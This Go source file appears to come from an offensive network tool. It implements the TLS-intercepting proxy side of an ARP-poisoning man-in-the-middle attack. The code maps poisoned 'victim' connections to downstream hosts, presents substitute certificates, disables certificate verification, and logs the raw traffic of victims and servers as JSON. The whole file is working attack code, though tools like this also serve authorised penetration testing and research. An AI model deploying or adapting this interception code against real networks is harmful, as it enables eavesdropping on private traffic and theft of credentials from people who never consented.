package proxy

import (
	"crypto/tls"
	"github.com/impostorkeanu/eavesarp-ng/misc"
	gs "github.com/impostorkeanu/gosplit"
	"go.uber.org/zap"
	"io"
	"sync"
	"time"
)

type (
	// TCPCfg implements various GoSplit interfaces, allowing
	// it to be passed to the TLS intercepting proxy it offers.
	TCPCfg struct {
		// connMap is a mapping of source addresses to downstream
		// net.IP instances, allowing the proxy to discover the
		// downstream IP address that will receive proxied traffic.
		//
		// Note: mapping values are set by eavesarp_ng.AttackSnac
		// during poisoning attacks.
		connMap              *sync.Map
		downstreamCertGetter DsCertGetter // function to get a TLS certificate for downstreams
		log                  *zap.Logger  // logger for log events
		dataW                io.Writer    // writer to receive JSON data
	}

	// DsCertGetter is a function used to get the certificate for
	// TLS connections to downstreams.
	DsCertGetter func(downstreamIP string) func(*tls.ClientHelloInfo) (*tls.Certificate, error)
)

var (
	// dsTLSCfg is the downstream TLS configuration used for
	// all downstream configurations.
	dsTLSCfg = &tls.Config{
		InsecureSkipVerify: true, // skip TLS verification for downstreams
	}
)

// NewTCPCfg initializes and returns a pointer to a TCPCfg, which
// implements all necessary GoSplit interfaces.
func NewTCPCfg(connAddrs *sync.Map, downstreamCertGetter DsCertGetter, log *zap.Logger, dataLog io.Writer) *TCPCfg {
	return &TCPCfg{
		log:                  log,
		connMap:              connAddrs,
		downstreamCertGetter: downstreamCertGetter,
		dataW:                dataLog,
	}
}

//==========================
// GOSPLIT INTERFACE METHODS
//==========================

func (cfg *TCPCfg) RecvVictimData(cI gs.ConnInfo, b []byte) {
	if cfg.dataW == nil {
		return
	}
	data := connInfoToData(cI, b, misc.VictimDataSender)
	if err := data.Log(cfg.dataW); err != nil {
		cfg.log.Error("failed to write victim data to log", zap.Error(err))
	}
}

func (cfg *TCPCfg) RecvDownstreamData(cI gs.ConnInfo, b []byte) {
	if cfg.dataW == nil {
		return
	}
	data := connInfoToData(cI, b, misc.DownstreamDataSender)
	if err := data.Log(cfg.dataW); err != nil {
		cfg.log.Error("failed to write downstream data to log", zap.Error(err))
	}
}

// RecvConnStart to implement gosplit.ConnInfoReceiver.
func (cfg *TCPCfg) RecvConnStart(i gs.ConnInfo) {
	cfg.log.Debug("new connection started", zap.Any("conn", i))
}

// RecvConnEnd to implement gosplit.ConnInfoReceiver
//
// This removes the cfg.connMap entry for the current connection.
func (cfg *TCPCfg) RecvConnEnd(i gs.ConnInfo) {
	cfg.log.Debug("connection ended", zap.Any("conn", i))
	cfg.connMap.Delete(misc.Addr{
		IP: i.Victim.IP, Port: i.Victim.Port,
		Transport: misc.TCPTransport})
}

func (cfg *TCPCfg) RecvLog(r gs.LogRecord) {
	cfg.log.Info("received log event from tcp proxy", zap.Any("record", r))
}

func (cfg *TCPCfg) GetProxyTLSConfig(_ gs.Addr, _ gs.Addr, dsA *gs.Addr) (*tls.Config, error) {
	return &tls.Config{
		InsecureSkipVerify: true,
		GetCertificate:     cfg.downstreamCertGetter(dsA.IP),
	}, nil
}

func (cfg *TCPCfg) GetDownstreamAddr(_ gs.Addr, vicA gs.Addr) (ds *gs.Addr, err error) {
	// try to retrieve downstream connection a few times
	for i := 0; i < 3; i++ {
		if d, ok := cfg.connMap.Load(misc.Addr{IP: vicA.IP, Port: vicA.Port, Transport: misc.TCPTransport}); ok {
			ds = new(gs.Addr)
			ds.IP, ds.Port = d.(misc.Addr).IP, d.(misc.Addr).Port
			return
		}
		time.Sleep(10 * time.Millisecond)
	}
	return
}

func (cfg *TCPCfg) GetDownstreamTLSConfig(_ gs.Addr, _ gs.Addr, _ gs.Addr) (*tls.Config, error) {
	return dsTLSCfg, nil
}

func connInfoToData(c gs.ConnInfo, data []byte, sender misc.DataSender) misc.Data {
	d := misc.Data{
		Sender:         sender,
		VictimAddr:     misc.Addr{IP: c.Victim.IP, Port: c.Victim.Port},
		ProxyAddr:      misc.Addr{IP: c.Proxy.IP, Port: c.Proxy.Port},
		Transport:      misc.TCPTransport,
		Raw:            data,
		DownstreamAddr: nil,
	}
	if c.Downstream != nil {
		d.DownstreamAddr = &misc.Addr{IP: c.Downstream.IP, Port: c.Downstream.Port}
	}
	return d
}
